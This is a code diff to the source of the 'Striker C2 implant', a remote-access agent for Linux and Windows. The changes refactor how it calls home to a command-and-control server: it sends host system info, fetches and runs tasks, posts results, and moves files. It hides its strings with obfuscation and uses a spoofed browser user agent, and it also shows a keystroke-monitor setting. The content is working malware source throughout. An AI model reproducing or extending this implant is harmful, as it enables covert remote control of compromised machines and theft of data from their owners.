@@ -1,8 +1,8 @@
 /**
- *------------------------------------
- * Striker C2 implant for linux hosts.
- *                  Author: Umar Abdul
- *------------------------------------
+ *----------------------------------------------------
+ * The Striker C2 implant for linux and windows hosts.
+ *                                  Author: Umar Abdul
+ *----------------------------------------------------
  */
 
 #include "striker.h"
@@ -24,7 +24,10 @@
 // Keymon's process refresh rate (in secs)
 #define KEYMON_PROC_DELAY 1
 // Max URL length allowed
-#define URL_SIZE (sizeof(char) * 256)
+#define URL_SIZE (sizeof(char) * 512)
+// Max length for URL hostname, and path.
+#define MAX_URL_HOST_LEN 100
+#define MAX_URL_PATH_LEN 256
 
 /**
  * Uncomment these macros to disable SSL verification.
@@ -55,35 +58,195 @@ char *obfs_decode(char *str){
   return str;
 }
 
-#ifdef IS_LINUX
+void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
+  
+  *proto = HTTP;
+  if (!(strncmp("http://", url, 7))){
+    *port = 80;
+    url += 7;
+  }else if (!(strncmp("https://", url, 8))){
+    *proto = HTTPS;
+    *port = 443;
+    url += 8;
+  }
+  int host_len = 0;
+  path[0] = '/';
+  path[1] = '\0';
+  for (int i = 0; i < strlen(url) && i < MAX_URL_HOST_LEN; i++){
+    if (url[i] == '/'){
+      strncpy(path, url + i, MAX_URL_PATH_LEN);
+      break;
+    }
+    if (url[i] == ':'){
+      *port = atoi(url + i + 1);
+      break;
+    }
+    host_len++;
+  }
+  strncpy(host, url, host_len);
+  host[host_len] = '\0';
+}
 
-  CURL *init_curl(const char *path, buffer *buff, unsigned char absolute){
-    
+int http_get(char *url, buffer *body){
+
+  char *target_url;
+  if (url[0] == '/'){
+    // Treat URL as relative path
+    int url_len = strlen(BASE_URL) + strlen(url);
+    target_url = malloc(url_len + 1);
+    snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
+  }else{
+    target_url = malloc(strlen(url) + 1);
+    strncpy(target_url, url, strlen(url));
+  }
+  #ifdef IS_LINUX
     CURL *curl = curl_easy_init();
     if (!curl){
       #ifdef STRIKER_DEBUG
-      fprintf(stderr, "[-] Error initializing curl!\n");
+      fprintf(stderr, "[-] Error initializing curl!");
       #endif
+      free(target_url);
       exit(EXIT_FAILURE);
     }
-    char *url = malloc(URL_SIZE);
-    if (absolute)
-      strncpy(url, path, URL_SIZE);
-    else
-      snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
-    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_URL, target_url);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
     #ifdef SKIP_PEER_VERIFICATION
       curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     #endif
     #ifdef SKIP_HOST_VERIFICATION
       curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     #endif
-    free(url);
-    return curl;
+    CURLcode res = curl_easy_perform(curl);
+    int rsp_code;
+    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
+    curl_easy_cleanup(curl);
+    free(target_url);
+    if (res != CURLE_OK){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] Error making GET request to: %s: %s\n", target_url, curl_easy_strerror(res));
+      #endif
+      return 0;
+    }
+    return rsp_code;
+  #else
+    char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
+    int urlLen = strlen(target_url);
+    wchar_t wcUrl[urlLen+1];
+    mbstowcs(wcUrl, target_url, urlLen + 1);
+    HINTERNET hInternet = InternetOpen(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hResponse = InternetOpenUrlW(hInternet, wcUrl, L"", 0, 0, 0);
+    if (!hResponse){
+      InternetCloseHandle(hInternet);
+      return 0;
+    }
+    DWORD dwStatusCode;
+    DWORD dwHeaderSize = sizeof(DWORD);
+    HttpQueryInfo(hResponse, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
+    DWORD dwBlockSize = 1024;
+    DWORD dwBytesRead;
+    char *buff = malloc(dwBlockSize + 1);
+    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
+      if (!dwBytesRead)
+        break;
+      buff[dwBytesRead] = '\0';
+      append_buffer(body, buff, strlen(buff));
+    }
+    free(buff);
+    InternetCloseHandle(hResponse);
+    InternetCloseHandle(hInternet);
+    return dwStatusCode;
+  #endif
+}
+
+int http_post(char *url, cJSON *data, buffer *body){
+
+  char strs[][70] = {"[OBFS_ENC]Content-Type: application/json", "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)", "[OBFS_ENC]POST"};
+  for (int i = 0; i < 3; i++)
+    obfs_decode(strs[i]);
+  char *target_url;
+  if (url[0] == '/'){
+    // Treat URL as relative path
+    int url_len = strlen(BASE_URL) + strlen(url);
+    target_url = malloc(url_len + 1);
+    snprintf(target_url, url_len + 1, "%s%s", BASE_URL, url);
+  }else{
+    target_url = malloc(strlen(url) + 1);
+    strncpy(target_url, url, strlen(url));
   }
+  #ifdef IS_LINUX
+    CURL *curl = curl_easy_init();
+    if (!curl){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] Error initializing curl!");
+      #endif
+      free(target_url);
+      exit(EXIT_FAILURE);
+    }
+    char *post_body = cJSON_PrintUnformatted(data);
+    struct curl_slist *post_headers = curl_slist_append(NULL, strs[0]);
+    curl_easy_setopt(curl, CURLOPT_URL, target_url);
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_body);
+    CURLcode res = curl_easy_perform(curl);
+    int rsp_code;
+    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
+    curl_easy_cleanup(curl);
+    free(post_body);
+    curl_slist_free_all(post_headers);
+    free(target_url);
+    if (res != CURLE_OK){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] Error making POST request to: %s: %s\n", target_url, curl_easy_strerror(res));
+      #endif
+      return 0;
+    }
+    return rsp_code;
+  #else
+    DWORD dwStatusCode = 0;
+    char *urlHost = malloc(MAX_URL_HOST_LEN);
+    int urlPort;
+    char *urlPath = malloc(MAX_URL_PATH_LEN);
+    URL_PROTO urlProto;
+    parse_url(target_url, &urlProto, urlHost, &urlPort, urlPath);
+    char *postData = cJSON_PrintUnformatted(data);
+    HINTERNET hInternet = InternetOpenA(strs[1], INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[2], urlPath, NULL, NULL, NULL, 0, 0);
+    if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] Error making POST request to: %s", target_url);
+      #endif
+      goto end;
+    }
+    DWORD dwHeaderSize = sizeof(DWORD);
+    HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
+    DWORD dwBlockSize = 1024;
+    DWORD dwBytesRead;
+    char *buff = malloc(dwBlockSize + 1);
+    while (InternetReadFile(hRequest, buff, dwBlockSize, &dwBytesRead)){
+      if (!dwBytesRead)
+        break;
+      buff[dwBytesRead] = '\0';
+      append_buffer(body, buff, strlen(buff));
+    }
+    free(buff);
+    free(postData);
+    free(urlPath);
+    free(urlHost);
+    end:
+      InternetCloseHandle(hRequest);
+      InternetCloseHandle(hConnect);
+      InternetCloseHandle(hInternet);
+      return dwStatusCode;
+  #endif
+}
+
+#ifdef IS_LINUX
 
   size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){
 
@@ -129,7 +292,10 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     obfs_decode(strs[i]);
   #ifdef IS_LINUX
     buffer *body = create_buffer(0);
-    CURL *curl = init_curl(url, body, 1);
+    CURL *curl = curl_easy_init();
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
     CURLcode res;
     curl_mime *form;
     curl_mimepart *field;
@@ -159,8 +325,8 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
 short int download_file(char *url, FILE *wfo, buffer *result_buff){
 
   #ifdef IS_LINUX
-    CURL *curl = init_curl(url, NULL, 1);
     CURLcode res;
+    CURL *curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
@@ -401,7 +567,7 @@ task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
   for (int i = 0; i < 3; i++)
-    obfs_decode(strs[i]);  
+    obfs_decode(strs[i]);
   task *t = malloc(sizeof(task));
   t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
   t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
@@ -578,69 +744,44 @@ void start_session(){
   striker->abort = 0;
   char *tmp;
 
-  #ifdef IS_LINUX
-    CURL *curl;
-    CURLcode res;
-    int rsp_code;
-    // Build the common headers that will be used for GET and POST requests.
-    struct curl_slist *get_headers = NULL, *post_headers = NULL;
-    get_headers = curl_slist_append(get_headers, strs[1]);
-    post_headers = curl_slist_append(post_headers, strs[1]);
-    post_headers = curl_slist_append(post_headers, strs[2]);
-  #endif
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
+  int status_code;
 
   // Connects to the C2 server.
   contact_base: ;
     cJSON *info = sysinfo();
     cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
     cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
-    tmp = cJSON_PrintUnformatted(info);
-    cJSON_Delete(info);
     unsigned char connected = 0, fresh_conn = 0;
     while (!(striker->abort || connected)){
       queue_seek(base_addrs, 0);
       while (!queue_exhausted(base_addrs)){
         strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
         resize_buffer(body, 0);
-        #ifdef IS_LINUX
-          if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
-            curl = init_curl(strs[3], body, 0);
-            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
-            fresh_conn = 1;
-          }else{ // Try to resume the session by checking if the agent ID is valid for the server.
-            char *url = malloc(64);
-            char fmt[] = "[OBFS_ENC]/agent/ping/%s";
-            snprintf(url, 64, obfs_decode(fmt), striker->uid);
-            curl = init_curl(url, body, 0);
-            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
-            free(url);
-            fresh_conn = 0;
-          }
-          res = curl_easy_perform(curl);
-          curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
-          curl_easy_cleanup(curl);
-          if (res != CURLE_OK){
-            #ifdef STRIKER_DEBUG
-            fprintf(stderr, "[-] Error calling home %s: %s\n", BASE_URL, curl_easy_strerror(res));
-            #endif
-            sleep(striker->delay);
-            continue;
-          }
-          if (rsp_code != 200){
-            #ifdef STRIKER_DEBUG
-            fprintf(stderr, "[-] Non-200 response received: %d\n", rsp_code);
-            #endif
-            sleep(striker->delay);
-            continue;
-          }
-        #endif
+        if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
+          status_code = http_post(strs[3], info, body);
+          fresh_conn = 1;
+        }else{ // Try to resume the session by checking if the agent ID is valid for the server.
+          char *url = malloc(64);
+          char fmt[] = "[OBFS_ENC]/agent/ping/%s";
+          snprintf(url, 64, obfs_decode(fmt), striker->uid);
+          status_code = http_post(url, info, body);
+          free(url);
+          fresh_conn = 0;
+        }
+        if (status_code != 200){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Error calling home %s: %d\n", BASE_URL, status_code);
+          #endif
+          sleep(striker->delay);
+          continue;
+        }
         connected = 1;
         break;
       }
     }
-  free(tmp);
+    cJSON_Delete(info);
+
   if (!connected)
     goto end;
 
@@ -744,29 +885,21 @@ void start_session(){
           task *tsk = queue_get(completed_tasks);
           cJSON_AddItemToArray(results, tsk->result);
         }
-        char *result = cJSON_PrintUnformatted(results);
         resize_buffer(body, 0);
-        #ifdef IS_LINUX
-          curl = init_curl(tasksURL, body, 0);
-          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
-          res = curl_easy_perform(curl);
-          curl_easy_cleanup(curl);
-          if (res != CURLE_OK){
-            #ifdef STRIKER_DEBUG
-            fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
-            #endif
-            size_t count = cJSON_GetArraySize(results);
-            while (count > 0){
-              cJSON_DetachItemFromArray(results, count - 1);
-              count--;
-            }
-            cJSON_Delete(results);
-            free(result);
-            contact_fails++;
-            continue;          
+        status_code = http_post(tasksURL, results, body);
+        if (status_code != 200){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Error calling home: %d\n", status_code);
+          #endif
+          size_t count = cJSON_GetArraySize(results);
+          while (count > 0){
+            cJSON_DetachItemFromArray(results, count - 1);
+            count--;
           }
-        #endif
+          cJSON_Delete(results);
+          contact_fails++;
+          continue;          
+        }
         queue_seek(completed_tasks, 0);
         while (!queue_exhausted(completed_tasks)){
           task *tsk = queue_get(completed_tasks);
@@ -776,24 +909,18 @@ void start_session(){
           free_task(tsk);
         }
         cJSON_Delete(results);
-        free(result);
       }
     }
     // Fetch new tasks tasks.
     resize_buffer(body, 0);
-    #ifdef IS_LINUX
-      curl = init_curl(tasksURL, body, 0);
-      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
-      res = curl_easy_perform(curl);
-      curl_easy_cleanup(curl);
-      if (res != CURLE_OK){
-        #ifdef STRIKER_DEBUG
-        fprintf(stderr, "[-] Error fetching tasks: %s\n", curl_easy_strerror(res));
-        #endif
-        contact_fails++;
-        continue;
-      }
-    #endif
+    status_code = http_get(tasksURL, body);
+    if (status_code != 200){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] Error fetching tasks: %d\n", status_code);
+      #endif
+      contact_fails++;
+      continue;
+    }
     // Parse tasks and spawn execution threads.
     tmp = buffer_to_string(body);
     cJSON *tasksJSON = cJSON_Parse(tmp);
@@ -836,10 +963,6 @@ void start_session(){
   queue_free(completed_tasks, 0);
 
   end:
-    #ifdef IS_LINUX
-      curl_slist_free_all(get_headers);
-      curl_slist_free_all(post_headers);
-    #endif
     free_buffer(body);
     queue_free(base_addrs, 1);
     cleanup_session(striker);
